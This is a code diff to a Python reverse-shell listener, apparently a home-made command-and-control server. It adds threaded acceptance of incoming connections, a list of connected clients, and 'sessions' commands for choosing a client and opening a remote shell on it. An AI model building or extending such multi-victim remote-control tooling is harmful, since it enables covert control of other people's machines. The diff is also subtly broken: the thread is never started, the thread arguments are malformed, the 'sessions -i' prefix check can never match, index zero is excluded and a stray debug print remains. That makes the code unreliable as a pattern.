@@ -7,6 +7,7 @@ import pathlib
 import hashlib
 import datetime
 import termcolor
+import threading
 
 # TODO:
 #   1. Broadcast utility overhaul
@@ -292,8 +293,38 @@ def shell(sock: socket.socket, addr: tuple[str, int]) -> None:
         if sock:
             sock.close()
 
+def display_sessions() -> None:
+    """
+    Prints a table of all connected clients.
 
-def establish_connection(s: socket.socket) -> None:
+    :return: None
+    """
+    header = "ID\tCONNECTION\tADDRESS"
+    print(header)
+    print("-" * len(header))
+    for i, session in enumerate(CLIENTS):
+        info = f"{i}\t{session[0]}\t{session[1]}"
+        print(info)
+        print(len(info))
+
+
+def accept_new_connections(s: socket.socket) -> None:
+    """
+    Constantly accepts new connections if possible, and saves information about new connections.
+
+    :param s: Server side bound socket object
+    :type s: socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    :return: None
+    """
+    while True:
+        sock, addr = s.accept()
+        # Save new connection information
+        if (sock, addr) not in CLIENTS:
+            CLIENTS.append((sock, addr))
+        print(clr("[+] Connected to ") + str(addr))
+
+
+def handle_connections(s: socket.socket) -> None:
     """
     Listens for clients and accepts incoming connections.
 
@@ -304,27 +335,34 @@ def establish_connection(s: socket.socket) -> None:
     s.listen(5)
     sock = ""
     try:
-        while True:
-            print(f"\n{clr('[*] Server is running on -')} {SERVER_IP}")
-            print(f"{clr('[*] Listening for incoming connections...')}")
-            sock, addr = s.accept()
-            # FIXME
-            #     Broadcast related
-            #     if (sock, addr) not in CLIENTS:
-            #         CLIENTS.append((sock, addr))
-            print(clr("[+] Connected to ") + str(addr))
-            # Start a command line interface for the current client
-            shell(sock, addr)
+        print(f"\n{clr('[*] Server is running on -')} {SERVER_IP}")
+        print(f"{clr('[*] Listening for incoming connections...')}")
+        # Accept connections in a seperate thread to avoid blocking the terminal
+        thread = threading.Thread(target=accept_new_connections, args=(s))
 
-            # Wait for instructions after terminating the current connection
-            instruction = input(clr("[*] Would you like to stop listening for incoming connections? y/n "), ).lower()
-            if instruction == "y":  # Terminate server side
+        # User terminal for session handling
+        while True:
+            command = input(termcolor.colored("> ", "red"))
+            if command == "sessions":
+                display_sessions()
+            elif command[:10] == "sessions -i ":
+                i = command[10:]
+                if i.isdigit():
+                    if len(CLIENTS) > int(i) > 0:
+                        # Start a command line interface for the specified client
+                        shell(CLIENTS[int(i)][0], CLIENTS[int(i)][1])
+                    else:
+                        print(f"{clr('[!] ERROR: The specified index is out of range')}")
+                else:
+                    print(f"{clr('[!] ERROR: The specified index is not an integer')}")
+            elif command in ["exit", "quit"]:
                 break
     except KeyboardInterrupt:
         pass
     finally:
         if sock:
             sock.close()
+
 
 
 def main() -> None:
@@ -339,7 +377,7 @@ def main() -> None:
     # Establish server side
     s.bind((SERVER_IP, PORT))
     try:
-        establish_connection(s)
+        handle_connections(s)
     except KeyboardInterrupt:
         pass
     finally:
